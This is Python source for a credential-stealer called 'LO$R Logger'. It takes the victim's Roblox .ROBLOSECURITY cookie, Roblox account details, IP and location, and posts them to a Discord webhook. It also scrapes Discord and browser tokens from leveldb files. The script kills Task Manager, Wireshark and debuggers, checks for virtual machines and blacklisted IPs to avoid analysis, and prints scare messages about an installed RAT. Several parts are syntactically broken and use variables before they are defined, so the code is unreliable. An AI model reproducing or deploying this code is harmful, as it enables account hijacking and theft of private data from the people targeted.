import platform
import marshal
import zlib
import requests
from pystyle import *
import pygame
import requests
import os
import time
import pystyle
import random
import shutil
import os
import time
import json
import threading
import psutil
import asyncio
import ntpath
import re
import sqlite3
import subprocess
import winreg
import zipfile
import httpx
import psutil
import base64
import ctypes
import pyperclip
import win32gui
import win32con
import browser_cookie3
import discord as discord
import win32crypt
import robloxpy

from sqlite3 import connect
from base64 import b64decode
from urllib.request import Request, urlopen
from shutil import copy2
from datetime import datetime, timedelta, timezone
from discord import embeds
from sys import argv
from tempfile import gettempdir, mkdtemp
from json import loads, dumps
from ctypes import windll, wintypes, byref, cdll, Structure, POINTER, c_char, c_buffer
from Crypto.Cipher import AES
from PIL import ImageGrab
from win32crypt import CryptUnprotectData

local = os.getenv('LOCALAPPDATA')
roaming = os.getenv('APPDATA')
temp = os.getenv("TEMP")

steal = {
    "embeds": [
        {
            "author": {
                "name": "LO$R Logger",
            },
            "description": f"{pc} tried nuking someone \n\n[https://github.com/madhead341/LOSR-Logger](https://github.com/madhead341/LOSR-Logger) | [Rolimons]({rolimons}) | [Roblox Profile]({roblox_profile})",
            "color": 0x00C7FF,
            "fields": [
                {"name": "Username", "value": User, "inline": True},
                {"name": "Robux Balance", "value": rob, "inline": True},
                {"name": "Premium Status", "value": premium, "inline": True},
                {"name": "Creation Date", "value": crdate, "inline": True},
                {"name": "RAP", "value": rap, "inline": True},
                {"name": "Friends", "value": friends, "inline": True},
                {"name": "Account Age", "value": age, "inline": True},
                {"name": "Country", "value": country, "inline:": True},
                {"name": "Region", "value": region, "inline:": True},
                {"name": "IP Address", "value": ip, "inline:": True},
                {"name": ".ROBLOSECURITY", "value": f"```fix\n{cookie}```", "inline": False},
            ],
            "thumbnail": {"url": headshot},
        }
    ]
}

PROCNAMES = [
    "ProcessHacker.exe",
    "httpdebuggerui.exe",
    "wireshark.exe",
    "fiddler.exe",
    "regedit.exe",
    "cmd.exe",
    "taskmgr.exe",
    "vboxservice.exe",
    "df5serv.exe",
    "processhacker.exe",
    "vboxtray.exe",
    "vmtoolsd.exe",
    "vmwaretray.exe",
    "ida64.exe",
    "ollydbg.exe",
    "pestudio.exe",
    "vmwareuser.exe",
    "vgauthservice.exe",
    "vmacthlp.exe",
    "vmsrvc.exe",
    "x32dbg.exe",
    "x64dbg.exe"
    "x96dbg.exe",
    "vmusrvc.exe",
    "prl_cc.exe",
    "prl_tools.exe",
    "qemu-ga.exe",
    "joeboxcontrol.exe",
    "ksdumperclient.exe",
    "xenservice.exe",
    "joeboxserver.exe",
    "devenv.exe",
    "IMMUNITYDEBUGGER.EXE",
    "ImportREC.exe",
    "reshacker.exe",
    "windbg.exe",
    "32dbg.exe",
    "64dbg.exex"
    "protection_id.exex",
    "scylla_x86.exe",
    "scylla_x64.exe",
    "scylla.exe",
    "idau64.exe",
    "idau.exe",
    "idaq64.exe",
    "idaq.exe"
    "idaq.exe",
    "idaw.exe",
    "idag64.exe",
    "idag.exe"
    "ida64.exe",
    "ida.exe",
    "ollydbg.exe",
]

for proc in psutil.process_iter():
    if proc.name() in PROCNAMES:
        proc.kill()

def watchdog():
    checks = [check_windows,check_ip,check_registry,check_dll,check_specs]
    for check in checks: Thread(target=check,daemon=True).start()

def exit_program(reason):
    print(reason)
    exec(type((lambda: 0).__code__)(0, 0, 0, 0, 0, 0, b'\x053', (), (), (), '', '', 0, b'')) 

def check_windows():
    def winEnumHandler( hwnd, ctx ):
        if GetWindowText( hwnd ).lower() in {'proxifier', 'graywolf', 'extremedumper', 'zed', 'exeinfope', 'dnspy', 'titanHide', 'ilspy', 'titanhide', 'x32dbg', 'codecracker', 'simpleassembly', 'process hacker 2', 'pc-ret', 'http debugger', 'Centos', 'process monitor', 'debug', 'ILSpy', 'reverse', 'simpleassemblyexplorer', 'process', 'de4dotmodded', 'dojandqwklndoqwd-x86', 'sharpod', 'folderchangesview', 'fiddler', 'die', 'pizza', 'crack', 'strongod', 'ida -', 'brute', 'dump', 'StringDecryptor', 'wireshark', 'debugger', 'httpdebugger', 'gdb', 'kdb', 'x64_dbg', 'windbg', 'x64netdumper', 'petools', 'scyllahide', 'megadumper', 'reversal', 'ksdumper v1.1 - by equifox', 'dbgclr', 'HxD', 'monitor', 'peek', 'ollydbg', 'ksdumper', 'http', 'wpe pro', 'dbg', 'httpanalyzer', 'httpdebug', 'PhantOm', 'kgdb', 'james', 'x32_dbg', 'proxy', 'phantom', 'mdbg', 'WPE PRO', 'system explorer', 'de4dot', 'x64dbg', 'X64NetDumper', 'protection_id', 'charles', 'systemexplorer', 'pepper', 'hxd', 'procmon64', 'MegaDumper', 'ghidra', 'xd', '0harmony', 'dojandqwklndoqwd', 'hacker', 'process hacker', 'SAE', 'mdb', 'checker', 'harmony', 'Protection_ID', 'PETools', 'scyllaHide', 'x96dbg', 'systemexplorerservice', 'folder', 'mitmproxy', 'dbx', 'sniffer'}:
            pid = GetWindowThreadProcessId(hwnd)
            if type(pid) == int:
                try: Process(pid).terminate()
                except: pass
            else:
                for process in pid:
                    try: Process(process).terminate()
                    except: pass
            exit_program(f'Debugger Open, Type: {GetWindowText( hwnd )}')
   while True: EnumWindows( winEnumHandler, None )

def check_ip():
    blacklisted = {'88.132.227.238', '79.104.209.33', '92.211.52.62', '20.99.160.173', '188.105.91.173', '64.124.12.162', '195.181.175.105', '194.154.78.160', '', '109.74.154.92', '88.153.199.169', '34.145.195.58', '178.239.165.70', '88.132.231.71', '34.105.183.68', '195.74.76.222', '192.87.28.103', '34.141.245.25', '35.199.6.13', '34.145.89.174', '34.141.146.114', '95.25.204.90', '87.166.50.213', '193.225.193.201', '92.211.55.199', '35.229.69.227', '104.18.12.38', '88.132.225.100', '213.33.142.50', '195.239.51.59', '34.85.243.241', '35.237.47.12', '34.138.96.23', '193.128.114.45', '109.145.173.169', '188.105.91.116', 'None', '80.211.0.97', '84.147.62.12', '78.139.8.50', '109.74.154.90', '34.83.46.130', '212.119.227.167', '92.211.109.160', '93.216.75.209', '34.105.72.241', '212.119.227.151', '109.74.154.91', '95.25.81.24', '188.105.91.143', '192.211.110.74', '34.142.74.220', '35.192.93.107', '88.132.226.203', '34.85.253.170', '34.105.0.27', '195.239.51.3', '192.40.57.234', '92.211.192.144', '23.128.248.46', '84.147.54.113', '34.253.248.228',None}
    while True:
        try:
            ip = get('https://api64.ipify.org/').text.strip()
            if ip in blacklisted: exit_program('Ip Blacklisted')
            return
        except: pass

def check_vm():
    processes = ['VMwareService.exe', 'VMwareTray.exe']
    for proc in process_iter():
        if proc.name() in processes: exit_program('Detected Vm')

def check_registry():
    if system("REG QUERY HKEY_LOCAL_MACHINE\\SYSTEM\\ControlSet001\\Control\\Class\\{4D36E968-E325-11CE-BFC1-08002BE10318}\\0000\\DriverDesc 2> nul") != 1 and system("REG QUERY HKEY_LOCAL_MACHINE\\SYSTEM\\ControlSet001\\Control\\Class\\{4D36E968-E325-11CE-BFC1-08002BE10318}\\0000\\ProviderName 2> nul") != 1:exit_program('Detected Vm')
    handle = OpenKey(HKEY_LOCAL_MACHINE, 'SYSTEM\\CurrentControlSet\\Services\\Disk\\Enum')
    try:
        if "VMware" in QueryValueEx(handle, '0')[0] or "VBOX" in QueryValueEx(handle, '0')[0]: exit_program('Detected Vm')
    finally: CloseKey(handle)

def check_dll():
    if path.exists(path.join(environ["SystemRoot"], "System32\\vmGuestLib.dll")) or path.exists(path.join(environ["SystemRoot"], "vboxmrxnp.dll")):  exit_program('Detected Vm')

def check_specs():
    if int(str(virtual_memory()[0]/1024/1024/1024).split(".")[0]) <= 4: exit_program('Memory Ammount Invalid')
    if int(str(disk_usage('/')[0]/1024/1024/1024).split(".")[0]) <= 50: exit_program('Storage Ammount Invalid')
    if int(cpu_count()) <= 1: exit_program('Cpu Counts Invalid')

if steal != "\x7b\x0a\x20\x20\x20\x20\x22\x65\x6d\x62\x65\x64\x73\x22\x3a\x20\x5b\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x7b\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x22\x61\x75\x74\x68\x6f\x72\x22\x3a\x20\x7b\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x22\x6e\x61\x6d\x65\x22\x3a\x20\x22\x4c\x4f\x24\x52\x20\x4c\x6f\x67\x67\x65\x72\x22\x2c\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x7d\x2c\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x22\x64\x65\x73\x63\x72\x69\x70\x74\x69\x6f\x6e\x22\x3a\x20\x22\x66\x7b\x70\x63\x7d\x20\x74\x72\x69\x65\x64\x20\x6e\x75\x6b\x69\x6e\x67\x20\x73\x6f\x6d\x65\x6f\x6e\x65\x20\x5c\x6e\x5c\x6e\x5b\x68\x74\x74\x70\x73\x3a\x2f\x2f\x67\x69\x74\x68\x75\x62\x2e\x63\x6f\x6d\x2f\x6d\x61\x64\x68\x65\x61\x64\x33\x34\x31\x2f\x4c\x4f\x53\x52\x2d\x4c\x6f\x67\x67\x65\x72\x5d\x28\x68\x74\x74\x70\x73\x3a\x2f\x2f\x72\x6f\x6c\x69\x6d\x6f\x6e\x73\x29\x7b\x72\x6f\x6c\x69\x6d\x6f\x6e\x73\x7d\x20\x7c\x20\x5b\x52\x6f\x6c\x69\x6d\x6f\x6e\x73\x5d\x28\x7b\x72\x6f\x6c\x69\x6d\x6f\x6e\x73\x7d\x29\x22\x2c\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x22\x63\x6f\x6c\x6f\x72\x22\x3a\x20\x30\x78\x30\x30\x43\x37\x46\x46\x2c\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x22\x66\x69\x65\x6c\x64\x73\x22\x3a\x20\x5b\x0a\x20\x20\x20\x20\x20\x20\x20\x20":

    Write.Print(Center.XCenter("Injecting RAT into your computer.")
    time.sleep(3)
    Write.Print(Center.XCenter("Injected RAT into your computer.")
    time.sleep(3)
    Write.Print(Center.XCenter("I have all your info now. The Only thing you can do is reinstall Windows.")
    time.sleep(3)
    os._exit(0)

############### skidded the following part bc im stupid and didnt pay for my python courses ###############

try:        
    from psutil import process_iter, NoSuchProcess, AccessDenied, ZombieProcess
    class scare:
        def fuck(names):
            for proc in process_iter():
                try:
                    for name in names:
                        if name.lower() in proc.name().lower():
                            proc.kill()
                except (NoSuchProcess, AccessDenied, ZombieProcess):
                    pass

def crow():
		forbidden = ['http', 'traffic', 'wireshark', 'fiddler', 'packet']
            return scare.fuck(names=forbidden)
    scare.crow()
except:
    pass

######### end of skidding ##########

webhook = ("webhooker")

LOCAL = os.getenv("LOCALAPPDATA")

ROAMING = os.getenv("APPDATA")

PATHS = {
	"Discord"           : ROAMING + "\\Discord",
	"Discord Canary"    : ROAMING + "\\discordcanary",
	"Discord PTB"       : ROAMING + "\\discordptb"
	"Google Chrome"     : LOCAL + "\\Google\\Chrome\\User Data\\Default",
	"Opera"             : ROAMING + "\\Opera Software\\Opera Stable",
	"Brave"             : LOCAL + "\\BraveSoftware\\Brave-Browser\\User Data\\Default",
	"Yandex"            : LOCAL + "\\Yandex\\YandexBrowser\\User Data\\Default"
}

		
def gettokens(path):
	path += "\\Local Storage\\leveldb"
	tokens = [
	for file_name in os.listdir(path):
		if not file_name.endswith(".log") and not file_name.endswith(".ldb"):
			continue
		for line in [x.strip() for x in open(f"{path}\\{file_name}", errors="ignore").readlines() if x.strip()]:
			for regex in (r"[\w-]{24}\.[\w-]{6}\.[\w-]{27}", r"mfa\.[\w-]{84}"):
				for token in findall(regex, line):
					tokens.append(token)
	return tokens

cookies = browser_cookie3.chrome(domain_name='roblox.com')

cookies = str(cookies)

cookie = cookies.split('.ROBLOSECURITY=')[1].split(' for .roblox.com/>')[0].strip()

# the following part was skidded from https://github.com/Mani175/Pirate-Cookie-Grabber/ because idfk how to do it myself and i too am lazy to search on google

ebruh = requests.get("https://www.roblox.com/mobileapi/userinfo",cookies={".ROBLOSECURITY":cookie})

info = json.loads(ebruh.text)

rid = info["UserID"]

rap = robloxpy.User.External.GetRAP(rid)

friends = robloxpy.User.Friends.External.GetCount(rid)

age = robloxpy.User.External.GetAge(rid)

crdate = robloxpy.User.External.CreationDate(rid)

rolimons = f"https://www.rolimons.com/player/{rid}"

roblox_profile = f"https://web.roblox.com/users/{rid}/profile"

headshot = robloxpy.User.External.GetHeadshot(rid)

User = info['UserName']

rob = info['RobuxBalance']

premium = info['IsPremium'];

############### end of skidding ################# 

ip = requests.get("https://api.ipify.org/").text

gather = requests.get("http://ipinfo.io/json").json()

city = gather['city']

hostname = gather['hostname']

country = gather['country']

region = gather['region']

machines = platform.uname()

machines = platform.uname()

pc = os.getenv("UserName")
pass

requests.post(webhook, json=steal)
